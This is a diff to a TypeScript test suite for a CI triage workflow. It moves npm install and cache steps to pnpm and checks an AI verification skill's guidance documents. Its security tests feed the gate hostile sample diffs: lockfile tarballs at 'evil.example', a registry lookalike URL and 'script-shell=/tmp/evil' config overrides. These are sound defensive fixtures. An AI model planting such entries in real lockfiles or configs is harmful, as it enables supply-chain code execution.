@@ -24,7 +24,7 @@ import { parse } from 'yaml';
 
 const workflow = readFileSync('.github/workflows/qwen-triage.yml', 'utf8');
 const cacheProducerWorkflow = readFileSync(
-  '.github/workflows/npm-cache.yml',
+  '.github/workflows/pnpm-store.yml',
   'utf8',
 );
 const prSkill = readFileSync(
@@ -945,7 +945,7 @@ describe('qwen-triage tmux workflow', () => {
     expect(prepareStep).toContain('-u GITHUB_PATH');
     expect(prepareStep).toContain('-u GITHUB_STEP_SUMMARY');
     expect(prepareStep).toMatch(
-      new RegExp(`${escapeRegExp(strippedEnv)} \\\\\\s+npm ci`),
+      new RegExp(`${escapeRegExp(strippedEnv)} \\\\\\s+corepack pnpm install`),
     );
     expect(prepareStep).toMatch(
       new RegExp(`${escapeRegExp(strippedEnv)} \\\\\\s+npm run build`),
@@ -2862,9 +2862,35 @@ describe('qwen-triage verify hardening', () => {
         }).decision,
       ).toBe('run');
 
+      const pnpmOffReg = run({
+        trust: 'external',
+        diff: "+++ b/pnpm-lock.yaml\n+    resolution: {tarball: 'https://evil.example/x.tgz'}\n",
+      });
+      expect(pnpmOffReg.decision).toBe('skip');
+      expect(pnpmOffReg.reason).toContain('registry.npmjs.org');
+      const pnpmLookalike = run({
+        trust: 'external',
+        diff: "+++ b/pnpm-lock.yaml\n+    resolution: {tarball: 'https://evil.example/?u=https://registry.npmjs.org/x.tgz'}\n",
+      });
+      expect(pnpmLookalike.decision).toBe('skip');
+      expect(pnpmLookalike.reason).toContain('registry.npmjs.org');
+      expect(
+        run({
+          trust: 'external',
+          diff: "+++ b/pnpm-lock.yaml\n+    resolution: {tarball: 'https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz'}\n",
+        }).decision,
+      ).toBe('run');
+
       // Package-manager config: settings like `script-shell` redirect what
       // every later npm invocation executes.
-      for (const cfg of ['.npmrc', '.yarnrc', '.yarnrc.yml', 'bunfig.toml']) {
+      for (const cfg of [
+        '.npmrc',
+        '.yarnrc',
+        '.yarnrc.yml',
+        'bunfig.toml',
+        'pnpm-workspace.yaml',
+        '.pnpmfile.mjs',
+      ]) {
         const pm = run({
           trust: 'external',
           diff: `+++ b/${cfg}\n+script-shell=/tmp/evil\n`,
@@ -4741,6 +4767,181 @@ describe('qwen-triage verify hardening round 2', () => {
     expect(flat).toContain(
       'A validity control must run before the artifact it invalidates',
     );
+
+    // #12121: the migration moved the plaintext token into an encrypted
+    // vault and passed every test, yet the base build's WebView default
+    // profile kept the same token as UTF-16LE in Session Storage. It
+    // survived the upgrade and a confirmed reset. Only an upgrade arm
+    // (base writes real state, head runs over it) plus an encoding-aware
+    // scan of every store the old version wrote could see it.
+    expect(flat).toContain('upgrade arm');
+    expect(flat).toContain('every store the old version wrote');
+    expect(flat).toContain("Scan in the store's own encoding");
+    expect(flat).toContain('never the secret value');
+    expect(flat).toContain('captures of scan output');
+
+    // #12121: the native Retry screen only existed before the daemon's
+    // service worker was installed. After one successful load, the worker
+    // answered offline navigations itself, and its retry link dropped the
+    // #token= fragment. The author's fixtures never installed a worker.
+    expect(flat).toContain('Test the steady state, not only first contact');
+    expect(flat).toContain(
+      'Run error and recovery scenarios twice against the real peer',
+    );
+    expect(flat).toContain('confirm the persistent state exists');
+    expect(flat).toContain('navigator.serviceWorker.controller !== null');
+
+    // #12121: the WebView-124 fail-closed test was SKIPPED in both CI lanes.
+    // A mutant restoring fail-open behaviour was killed only on a local
+    // API 35 emulator.
+    expect(flat).toContain(
+      'A test that can skip is coverage only where it executes',
+    );
+    expect(flat).toContain("workflow's `on:` path/branch filters");
+    expect(flat).toContain('lane never ran');
+    expect(flat).toContain('label a static gate evaluation as inferred');
+    expect(flat).toContain('report it as a survivor for CI');
+
+    // #12121: a surviving editor-check mutant, driven through the real UI,
+    // sent one daemon's token to another daemon. Reading the code would
+    // have filed it as an ordinary gap. A survivor that cannot be driven is
+    // labelled as inferred.
+    expect(flat).toContain('Adjudicate a survivor by running its build');
+    expect(flat).toContain('label what you only inferred');
+    const testOnly = flat.slice(
+      flat.indexOf('**Test-only PRs**'),
+      flat.indexOf('**Third-party actions and dependencies**'),
+    );
+    expect(testOnly).toContain('out of reach within budget');
+    expect(testOnly).toContain('label the classification as inferred');
+    expect(testOnly).toContain('Adjudicate a survivor by running its build');
+    const classification = flat.slice(
+      flat.indexOf('Report the mutation matrix'),
+      flat.indexOf('**Layered guards hide each other'),
+    );
+    expect(classification).toContain('real defect in the mutant');
+    expect(classification).toContain('four outcomes');
+    expect(classification).toContain('does not establish a defect in head');
+
+    // #12121: a relay on another port fails the daemon's Host allowlist,
+    // and the rate-limited access log is not a request ledger.
+    expect(flat).toContain('behind a port mapping and never rewrite headers');
+    expect(flat).toContain('For an emulator client of a real `qwen serve`');
+    expect(flat).toContain(
+      'WebSocket `upgrade` handshake and bidirectional tunnel',
+    );
+    expect(flat).toContain("preserve the client's original `Host`");
+    expect(flat).toContain("Do not use the daemon's access log as a ledger");
+    expect(flat).toContain('pre-authentication rejects draw from separate');
+    expect(flat).toContain('wire captures and raw harness logs');
+    expect(flat).toContain(
+      'redact the recorded copy, not the request under test',
+    );
+
+    // The Android recipe lives in a reference file the restored .qwen tree
+    // carries, so the pointer must resolve.
+    expect(flat).toContain('references/android.md');
+    expect(flat).toContain('daemon-served Web Shell it renders');
+    const androidPath = '.qwen/skills/verify-pr/references/android.md';
+    expect(existsSync(androidPath)).toBe(true);
+    const androidRef = readFileSync(androidPath, 'utf8');
+    const androidFlat = androidRef.replace(/\s+/g, ' ');
+    expect(androidFlat).toContain(
+      'sdkmanager "system-images;android-35;google_apis;arm64-v8a"',
+    );
+    expect(androidFlat).toContain('avdmanager create avd');
+    expect(androidFlat).toContain('trigger the sandboxed');
+    expect(androidFlat).toContain('gradlew` / `gradlew.bat');
+    expect(androidFlat).toContain('corruption, not substitution');
+    expect(androidFlat).toContain('trusted base checksum');
+    expect(androidFlat).toContain('shasum -a 256');
+    expect(androidFlat).toContain(
+      'daemon with its own token, scratch `QWEN_HOME`',
+    );
+    expect(androidFlat).toContain(
+      'scratch directory alone does not sandbox its tools',
+    );
+    expect(androidFlat).toContain(
+      'adb -P <adb-server-port> -s emulator-<even-port>',
+    );
+    expect(androidFlat).toContain('forward tcp:<cdp-port>');
+    expect(androidFlat).toContain('apk/debug/app-debug.apk');
+    expect(androidFlat).toContain(
+      'apk/androidTest/debug/app-debug-androidTest.apk',
+    );
+    expect(androidFlat).toContain('emulator -list-avds');
+    expect(androidFlat).toContain('.github/workflows/mobile-shell.yml');
+    expect(androidFlat).toContain(
+      'read its `api-level:`, `arch:` and `require-profiles:` entries',
+    );
+    expect(androidFlat).toContain('window_animation_scale');
+    expect(androidFlat).toContain('transition_animation_scale');
+    expect(androidFlat).toContain('animator_duration_scale');
+    expect(androidFlat).toContain(
+      'only on an image whose WebView reports both',
+    );
+    expect(androidFlat).toContain('On other images omit it');
+    expect(androidFlat).toContain('In the measured table this is API 36 only');
+    expect(androidFlat).toContain(
+      'committed device tests do not assert that below-floor path',
+    );
+    expect(androidFlat).toContain(
+      'a red pristine control is not a mutant kill',
+    );
+    expect(androidFlat).toContain(
+      'Read the per-test status codes, not the summary line',
+    );
+    expect(androidFlat).toContain(
+      '`0` pass, `-2` failure, `-4` assumption skip',
+    );
+    expect(androidFlat).toContain('`1` started (not a result)');
+    expect(androidFlat).toContain(
+      '`-3` ignored (disabled, not a capability skip)',
+    );
+    expect(androidFlat).toContain(
+      '| `MULTI_PROFILE` | `DELETE_BROWSING_DATA` |',
+    );
+    expect(androidFlat).toContain('| API 35 | 124.0.6367.219 | yes | no |');
+    expect(androidFlat).toContain('setWebContentsDebuggingEnabled');
+    expect(androidFlat).toContain(
+      'Check that `@webview_devtools_remote_<pid>` and a page actually exist',
+    );
+    expect(androidFlat).toContain('adb exec-out run-as');
+    expect(androidFlat).toContain('app_webview/pref_store');
+    expect(androidFlat).toContain('`qwen-<browserId>`');
+    expect(androidFlat).toContain('adb uninstall com.qwen.mobileshell');
+    expect(androidFlat).toContain('git status --porcelain');
+    expect(androidFlat).toContain(
+      'positive control in the mutated file on each image',
+    );
+    expect(androidFlat).toContain('not as an adjudicated survivor');
+    expect(androidFlat).toContain('UTF-16LE');
+    expect(androidFlat).toContain('adb reverse');
+    expect(androidFlat).toContain('odd offset');
+    expect(androidFlat).toContain('Migration and persisted-state PRs');
+    expect(flat).toContain('**Migration and persisted-state PRs**');
+    for (const doc of [verifySkill, androidRef]) {
+      const expression = doc.match(/Search raw bytes with `([^`]+)`/)?.[1];
+      expect(expression).toBeDefined();
+      const output = execFileSync(
+        process.execPath,
+        [
+          '-e',
+          `
+          const secret = 'synthetic-marker';
+          const pattern = Buffer.from(secret, 'utf16le');
+          for (const offset of [8, 9]) {
+            const buf = Buffer.concat([Buffer.alloc(offset), pattern, Buffer.alloc(3)]);
+            console.log(${expression});
+          }
+          const buf = Buffer.alloc(64);
+          console.log(${expression});
+        `,
+        ],
+        { encoding: 'utf8' },
+      );
+      expect(output).toBe('8\n9\n-1\n');
+    }
   });
 
   // PR #7836's report said "Verdict: merge-ready — the 7 failures are all
@@ -4975,7 +5176,7 @@ describe('qwen-triage verify publish fidelity', () => {
         PREPARE_FAILURE_PHASE: 'install',
       });
       expect(real).toContain('treated as a PR failure');
-      expect(real).toContain('npm ci');
+      expect(real).toContain('pnpm install');
       // The install is retried, so this sentence is blaming the PR for two
       // consecutive failures and has to say which. Without the count a
       // reader cannot tell this verdict from the single-shot one that
@@ -4999,7 +5200,7 @@ describe('qwen-triage verify publish fidelity', () => {
         PREPARE_FAILURE_PHASE: 'build',
       });
       expect(buildPhase).toContain('npm run build');
-      expect(buildPhase).not.toContain('`npm ci` failed');
+      expect(buildPhase).not.toContain('`pnpm install` failed');
       // The build is single-shot, so the retry clause must not leak onto it.
       expect(buildPhase).not.toContain('twice in a row');
 
@@ -5576,16 +5777,19 @@ describe('qwen-triage verify round-3 hardening', () => {
 
     // Browser binary: downloaded after npm ci, and by the CLI of the
     // package the capture harness actually imports — never a hardcoded pin
-    // (M5). This lockfile has TWO Playwright trees: terminal-capture.ts
-    // imports `playwright`, but node_modules/.bin/playwright (what `npx
-    // playwright` resolves) is @playwright/test's CLI, which pins a
-    // different chromium revision. The install must therefore resolve the
+    // (M5). Root `playwright` and Web Shell's `@playwright/test` carry the
+    // same exact pin, and `npm run check:lockfile` fails if the manifests
+    // or their resolved trees drift, so both of those CLIs install one
+    // chromium revision. The parity does not reach the root
+    // `playwright-core` bin, which a mobile-mcp transitive dependency
+    // hoists there at an older revision. The install still resolves the
     // imported package's cli.js from the harness's own directory (the same
-    // algorithm as its import), not assume npm hoists `playwright` to the
-    // root — a hoist nothing pins. cli.js is absent from the package's
-    // exports map, so the workflow resolves the exported package.json and
-    // joins; binding this assertion to the harness's import keeps the two
-    // from drifting apart.
+    // algorithm as its import) instead of assuming npm hoists `playwright`
+    // to the root, so the binary keeps matching the import when the hoist
+    // layout changes or a workspace nests its own copy. cli.js is absent
+    // from the package's exports map, so the workflow resolves the exported
+    // package.json and joins; binding this assertion to the harness's
+    // import keeps the two from drifting apart.
     const capture = readFileSync(
       'integration-tests/terminal-capture/terminal-capture.ts',
       'utf8',
@@ -6078,6 +6282,16 @@ describe('qwen-triage verify round-3 hardening', () => {
     }
   });
 
+  it('bootstraps pnpm before the tmux verdict-producing install step', () => {
+    const tmuxJob = job('tmux-testing');
+    const bootstrap = stepIn('tmux-testing', 'Bootstrap pnpm');
+    expect(bootstrap).toContain('runuser -u node -- corepack pnpm --version');
+    expect(bootstrap).not.toContain('verdict=');
+    expect(tmuxJob.indexOf("name: 'Bootstrap pnpm'")).toBeLessThan(
+      tmuxJob.indexOf("name: 'Install and build PR app'"),
+    );
+  });
+
   // Run 30319209722 reported `fail` against a PR whose only crime was that
   // npm exec'd esbuild's binary before its own write was closed (ETXTBSY),
   // so the install is now retried once.
@@ -6096,8 +6310,10 @@ describe('qwen-triage verify round-3 hardening', () => {
     const dir = mkdtempSync(join(tmpdir(), 'prepare-retry-'));
     try {
       const work = join(dir, 'work');
-      mkdirSync(work, { recursive: true });
-      const calls = join(dir, 'npm-ci-calls');
+      // Stands in for what a failed attempt leaves behind: the retry must
+      // clear it, since pnpm install (unlike npm ci) keeps node_modules.
+      mkdirSync(join(work, 'node_modules', 'stale'), { recursive: true });
+      const calls = join(dir, 'install-calls');
       writeFileSync(calls, '');
       writeFileSync(
         join(dir, 'runuser'),
@@ -6110,17 +6326,14 @@ describe('qwen-triage verify round-3 hardening', () => {
         { mode: 0o755 },
       );
       writeFileSync(
-        join(dir, 'npm'),
+        join(dir, 'corepack'),
         [
           '#!/usr/bin/env bash',
-          // Only `ci` is counted/failed: `run build` shares this stub and
-          // must stay a success, or an install-phase assertion could pass
-          // because the BUILD failed instead.
-          'if [ "$1" = ci ]; then',
-          '  printf "ci\\n" >> "$NPM_CI_CALLS"',
-          '  n=$(wc -l < "$NPM_CI_CALLS" | tr -d " ")',
-          '  if [ "$n" -le "$NPM_CI_FAILURES" ]; then',
-          '    echo "npm error ETXTBSY" >&2',
+          'if [ "$1 $2" = "pnpm install" ]; then',
+          '  printf "install\\n" >> "$INSTALL_CALLS"',
+          '  n=$(wc -l < "$INSTALL_CALLS" | tr -d " ")',
+          '  if [ "$n" -le "$INSTALL_FAILURES" ]; then',
+          '    echo "ERR_PNPM_LIFECYCLE ETXTBSY" >&2',
           '    exit 1',
           '  fi',
           'fi',
@@ -6128,6 +6341,11 @@ describe('qwen-triage verify round-3 hardening', () => {
         ].join('\n'),
         { mode: 0o755 },
       );
+      // `npm run build` must stay a success, or an install-phase assertion
+      // could pass because the BUILD failed instead.
+      writeFileSync(join(dir, 'npm'), '#!/usr/bin/env bash\nexit 0\n', {
+        mode: 0o755,
+      });
       for (const noop of ['chown', 'curl']) {
         writeFileSync(join(dir, noop), '#!/usr/bin/env bash\nexit 0\n', {
           mode: 0o755,
@@ -6141,8 +6359,8 @@ describe('qwen-triage verify round-3 hardening', () => {
         env: {
           ...process.env,
           PATH: `${dir}:${process.env.PATH}`,
-          NPM_CI_CALLS: calls,
-          NPM_CI_FAILURES: String(failures),
+          INSTALL_CALLS: calls,
+          INSTALL_FAILURES: String(failures),
           RUNNER_TEMP: dir,
           GITHUB_WORKSPACE: work,
           GITHUB_OUTPUT: out,
@@ -6157,6 +6375,7 @@ describe('qwen-triage verify round-3 hardening', () => {
           ? readFileSync(calls, 'utf8').trim().split('\n').length
           : 0,
         log: readFileSync(join(dir, resultsDir, 'prepare.log'), 'utf8'),
+        staleLeft: existsSync(join(work, 'node_modules', 'stale')),
       };
     } finally {
       rmSync(dir, { recursive: true, force: true });
@@ -6167,7 +6386,7 @@ describe('qwen-triage verify round-3 hardening', () => {
     ['verify', 'verify-results'],
     ['tmux-testing', 'tmux-results'],
   ]) {
-    it(`retries a transient npm ci once in the ${jobName} lane`, () => {
+    it(`retries a transient pnpm install once in the ${jobName} lane`, () => {
       // One ETXTBSY-style failure then success: the run must continue to
       // the build with no verdict at all. This is the arm the bug lives in
       // — before the retry it emitted verdict=fail here.
@@ -6176,6 +6395,7 @@ describe('qwen-triage verify round-3 hardening', () => {
       expect(flaky.output).not.toContain('verdict=');
       expect(flaky.log).toContain('retrying once');
       expect(flaky.log).toContain('$ npm run build');
+      expect(flaky.staleLeft).toBe(false);
 
       // A tree that is genuinely broken still fails, and the retry is
       // bounded: exactly two attempts, not an unbounded loop.
@@ -6192,6 +6412,7 @@ describe('qwen-triage verify round-3 hardening', () => {
       expect(clean.attempts).toBe(1);
       expect(clean.output).not.toContain('verdict=');
       expect(clean.log).not.toContain('retrying once');
+      expect(clean.staleLeft).toBe(true);
     });
   }
 
@@ -6219,7 +6440,7 @@ describe('qwen-triage verify round-3 hardening', () => {
       ['publish-tmux', 'Post tmux result comment'],
     ]) {
       const publish = stepIn(jobName, stepName);
-      const install = publish.indexOf("PREPARE_COMMAND='npm ci'");
+      const install = publish.indexOf("PREPARE_COMMAND='pnpm install'");
       const build = publish.indexOf("PREPARE_COMMAND='npm run build'");
       expect(install).toBeGreaterThan(-1);
       expect(build).toBeGreaterThan(install);
@@ -6864,9 +7085,9 @@ describe('qwen-triage tmux lane parity', () => {
   // post-save hook, so PR lifecycle scripts cannot write to the shared
   // cache. Swapping to `actions/cache` would re-enable the save path and
   // let a PR poison subsequent runs.
-  it('pins the npm cache step to restore-only in both lanes', () => {
+  it('pins the pnpm store step to restore-only in both lanes', () => {
     for (const jobName of ['verify', 'tmux-testing']) {
-      const cacheStep = stepIn(jobName, 'Restore npm cache');
+      const cacheStep = stepIn(jobName, 'Restore pnpm store');
       expect(cacheStep).toContain('actions/cache/restore@');
       expect(cacheStep).not.toMatch(/uses:\s*'actions\/cache@/);
       // A separate save step would reopen the same hole the
@@ -6876,53 +7097,53 @@ describe('qwen-triage tmux lane parity', () => {
     }
   });
 
-  it('points npm ci at the restored cache directory in both lanes', () => {
+  it('points pnpm install at the restored store in both lanes', () => {
     for (const jobName of ['verify', 'tmux-testing']) {
       const prepare = stepIn(jobName, 'Install and build PR app');
-      expect(prepare).toContain('--cache "$RUNNER_TEMP/npm-cache"');
+      expect(prepare).toContain('--store-dir "$RUNNER_TEMP/pnpm-store"');
       expect(prepare).toContain(
-        'npm ci --prefer-offline --no-audit --progress=false --cache "$RUNNER_TEMP/npm-cache"',
+        'corepack pnpm install --frozen-lockfile --prefer-offline --reporter=append-only --store-dir "$RUNNER_TEMP/pnpm-store"',
       );
-      expect(prepare).toContain('mkdir -p "$RUNNER_TEMP/npm-cache"');
-      expect(prepare).toContain('chown -R node:node "$RUNNER_TEMP/npm-cache"');
-      const cacheStep = stepIn(jobName, 'Restore npm cache');
+      expect(prepare).toContain('mkdir -p "$RUNNER_TEMP/pnpm-store"');
+      expect(prepare).toContain('chown -R node:node "$RUNNER_TEMP/pnpm-store"');
+      const cacheStep = stepIn(jobName, 'Restore pnpm store');
       const cachePath = cacheStep.match(
         /path:\s*'\$\{\{\s*runner\.temp\s*\}\}\/([^']+)'/,
       )?.[1];
       expect(cachePath).toBeTruthy();
-      const npmCaches = [
-        ...prepare.matchAll(/--cache "\$RUNNER_TEMP\/([^"]+)"/g),
+      const stores = [
+        ...prepare.matchAll(/--store-dir "\$RUNNER_TEMP\/([^"]+)"/g),
       ].map((m) => m[1]);
-      expect(npmCaches.length).toBeGreaterThanOrEqual(2);
-      for (const c of npmCaches) expect(c).toBe(cachePath);
+      expect(stores.length).toBeGreaterThanOrEqual(2);
+      for (const c of stores) expect(c).toBe(cachePath);
     }
   });
-  it('clears stale npm cache before restore in both lanes', () => {
+  it('clears stale pnpm store before restore in both lanes', () => {
     for (const jobName of ['verify', 'tmux-testing']) {
-      const clearStep = stepIn(jobName, 'Clear stale npm cache');
+      const clearStep = stepIn(jobName, 'Clear stale pnpm store');
       expect(clearStep, `${jobName} must have a clear step`).toContain(
         'rm -rf',
       );
-      const clearIdx = job(jobName).indexOf("'Clear stale npm cache'");
-      const restoreIdx = job(jobName).indexOf("'Restore npm cache'");
+      const clearIdx = job(jobName).indexOf("'Clear stale pnpm store'");
+      const restoreIdx = job(jobName).indexOf("'Restore pnpm store'");
       expect(clearIdx).toBeGreaterThan(-1);
       expect(restoreIdx).toBeGreaterThan(-1);
       expect(clearIdx).toBeLessThan(restoreIdx);
     }
   });
 
-  it('reports the npm cache hit so a permanent miss is visible in both lanes', () => {
+  it('reports the pnpm store hit so a permanent miss is visible in both lanes', () => {
     for (const jobName of ['verify', 'tmux-testing']) {
-      const cacheStep = stepIn(jobName, 'Restore npm cache');
-      expect(cacheStep).toContain("id: 'npm-cache'");
-      const reportStep = stepIn(jobName, 'Report npm cache hit');
-      expect(reportStep).toContain('steps.npm-cache.outputs.cache-hit');
+      const cacheStep = stepIn(jobName, 'Restore pnpm store');
+      expect(cacheStep).toContain("id: 'pnpm-store'");
+      const reportStep = stepIn(jobName, 'Report pnpm store hit');
+      expect(reportStep).toContain('steps.pnpm-store.outputs.cache-hit');
       expect(reportStep).toContain('GITHUB_STEP_SUMMARY');
     }
   });
 });
 
-describe('qwen-triage npm cache producer', () => {
+describe('qwen-triage pnpm store producer', () => {
   it('saves with the same key and path the triage lanes restore', () => {
     expect(cacheProducerWorkflow).toContain('actions/cache/save@');
     // Prettier may choose single or double quotes depending on inner
@@ -6939,7 +7160,7 @@ describe('qwen-triage npm cache producer', () => {
       cacheProducerWorkflow.match(/key:\s*('(?:[^']|'')+'|"[^"]+")/)?.[1],
     );
     for (const jobName of ['verify', 'tmux-testing']) {
-      const restoreStep = stepIn(jobName, 'Restore npm cache');
+      const restoreStep = stepIn(jobName, 'Restore pnpm store');
       const path = yamlScalar(
         restoreStep.match(/path:\s*('[^']+'|"[^"]+")/)?.[1],
       );
